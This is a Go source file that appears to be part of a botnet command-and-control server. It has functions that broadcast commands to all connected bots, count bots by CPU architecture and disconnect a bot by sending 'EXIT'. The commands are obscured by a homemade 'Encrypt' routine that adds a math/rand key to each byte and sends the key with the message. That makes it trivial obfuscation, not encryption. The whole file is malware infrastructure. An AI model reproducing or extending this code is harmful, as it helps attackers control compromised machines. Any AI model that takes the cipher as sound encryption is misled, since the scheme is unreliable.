package bot_server

import (
	"bytes"
	"fmt"
	random "math/rand"
	"net"
	"time"
)

func Broadcast(command string) {
	BotsList.Range(func(_, conn any) bool {
		Send(command, conn.(*Bot).Conn)
		time.Sleep(100 * time.Millisecond)
		return true
	})
}

func Send(command string, conn net.Conn) {
	cmd := Encrypt([]byte(command))
	if cmd == nil {
		return
	}
	conn.Write([]byte(cmd))
}

func genKey(length int) []byte {
	s1 := random.NewSource(time.Now().UnixNano())
	r1 := random.New(s1)
	const chars = "qwertyuioasdfghjkzxcvbnmQWERTYUIOASDFGHJKZXCVBNM1234567890!@#$^&()-+"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = chars[r1.Intn(len(chars))]
	}
	return result
}

func Encrypt(command []byte) []byte {
	key := genKey(256)
	var _result []byte

	for x, c := range command {
		_result = append(_result, byte(c)+key[x%len(key)])
	}

	return append(key[:128], append(_result, key[128:]...)...)
}

func GetBots() (int, string) {

	var res string

	resmap := make(map[string]int)

	BotsList.Range(func(_, b any) bool {
		resmap[b.(*Bot).I.Arch]++
		return true
	})

	for arch, count := range resmap {
		res += fmt.Sprintf("%s: %d\n\r", arch, count)
	}

	return BotCount, string(bytes.TrimSuffix([]byte(res), []byte{10, 13}))
}

func DeleteBot(ip string) bool {
	v, l := BotsList.LoadAndDelete(ip)
	if !l {
		return false
	}

	Send("EXIT", v.(*Bot).Conn)

	return true
}
